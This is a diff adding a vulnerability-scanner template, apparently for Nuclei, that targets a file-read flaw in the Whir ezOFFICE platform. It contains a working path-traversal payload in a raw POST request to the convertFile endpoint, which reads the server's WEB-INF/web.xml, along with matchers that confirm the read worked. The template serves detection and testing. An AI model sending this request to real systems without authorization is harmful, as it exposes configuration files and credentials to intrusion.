@@ -1,0 +1,29 @@
+id: whir-ezoffice-file-read
+
+info:
+  name: Whir ezOFFICE convertFile File Reading Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises, and institutions.
+    There is a file reading vulnerability in the Wanhu ezOFFICE collaborative management platform. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/WEB-INF/struts-config/struts-config.xml"
+          - "com.whir.common.util"
